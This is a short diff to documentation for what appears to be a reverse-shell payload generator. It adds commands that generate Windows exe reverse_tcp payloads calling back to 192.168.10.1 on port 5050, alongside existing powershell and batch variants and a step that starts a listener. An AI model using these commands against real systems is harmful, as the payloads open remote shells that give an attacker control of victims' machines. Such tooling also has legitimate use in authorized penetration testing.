@@ -48,6 +48,9 @@ generate payload=windows/powershell/reverse_tcp lport=5050
 
 generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050
 generate payload=windows/batch/reverse_tcp lport=5050
+
+generate payload=windows/exe/reverse_tcp lhost=192.168.10.1 lport=5050
+generate payload=windows/exe/reverse_tcp lport=5050
 ```
 
 Start the server and listen for incoming connections:
